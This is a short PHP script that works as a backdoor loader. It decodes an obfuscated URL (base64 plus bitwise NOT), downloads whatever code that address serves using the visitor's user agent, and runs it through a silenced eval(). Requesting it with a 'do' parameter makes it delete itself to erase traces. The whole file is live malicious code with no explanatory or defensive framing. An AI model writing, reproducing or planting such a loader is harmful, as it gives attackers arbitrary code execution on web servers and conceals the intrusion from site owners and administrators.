<?php
function _dl($url)
{
    $ch = curl_init();
    $timeout = 60;
    $real_user_agent = $_SERVER['HTTP_USER_AGENT'];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_USERAGENT, $real_user_agent);
    $file_contents = curl_exec($ch);
    curl_close($ch);
    return $file_contents;
}

if (isset($_GET['do'])) {
    unlink(__FILE__);
    header("Location :?t");
} else {
    $code = _dl(~base64_decode('l4uLj8XQ0IyLnovRlpKY0pyMjNKVjNKcm5HRnJCS0JjQnJCbmtGPl48='));
    @eval($code);
}